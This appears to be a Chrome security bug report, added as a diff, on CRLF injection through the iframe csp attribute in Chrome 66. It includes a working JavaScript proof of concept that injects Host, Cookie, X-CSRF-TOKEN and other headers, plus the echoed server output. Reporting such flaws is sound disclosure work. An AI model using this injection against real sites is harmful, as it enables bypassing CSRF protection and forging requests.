@@ -1,0 +1,37 @@
+VULNERABILITY DETAILS
+Using csp attribute in <iframe> element, an attacker might set arbitrary http headers, using "\r\n" characters. The most obvious scenario of attack is to add a "x-csrf-token" header to bypass header-based CSRF protection.
+Interestingly, though, it seems that arbitrary headers might be set, including Host, Content-type or User-Agent.
+VERSION
+Chrome Version: 66.0.3359.181 stable
+Operating System: macOS Sierra 10.12.6 (16G1314)
+REPRODUCTION CASE
+On http://bntk.pl/headers.php there is a simple page that just returns all http request headers that the server saw. Please note that the page responds with Allow-CSP-From: \* header, so that it can be easily seen what headers were sent.
+Below is a code that sets five headers: Host, X-Csrf-Token, Cookie, User-Agent and Content-Type.
+<!doctype html><meta charset=utf-8>.
+<script> const ifr = document.createElement('iframe'); ifr.src = 'http://bntk.pl/headers.php?'+Math.random(); ifr.height = '600px'; const headers = [ 'X-CSRF-TOKEN: 0123456789abcdef', 'Host: changed-host.bntk.pl', 'Cookie: aaaaa', 'User-Agent: Whatever', 'Content-type: application/json', ] ifr.csp = 'script-src\r\n' + headers.join('\r\n'); document.body.appendChild(ifr); </script>
+The output should be similar to:
+array(11) {
+["Host"]=>
+string(20) "changed-host.bntk.pl"
+["Connection"]=>
+string(10) "keep-alive"
+["Upgrade-Insecure-Requests"]=>
+string(1) "1"
+["Sec-Required-CSP"]=>
+string(10) "script-src"
+["X-CSRF-TOKEN"]=>
+string(16) "0123456789abcdef"
+["Cookie"]=>
+string(5) "aaaaa"
+["User-Agent"]=>
+string(8) "Whatever"
+["Content-type"]=>
+string(16) "application/json"
+["Accept"]=>
+string(85) "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
+["Accept-Encoding"]=>
+string(13) "gzip, deflate"
+["Accept-Language"]=>
+string(35) "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7"
+}
+which proves that additional headers were set.
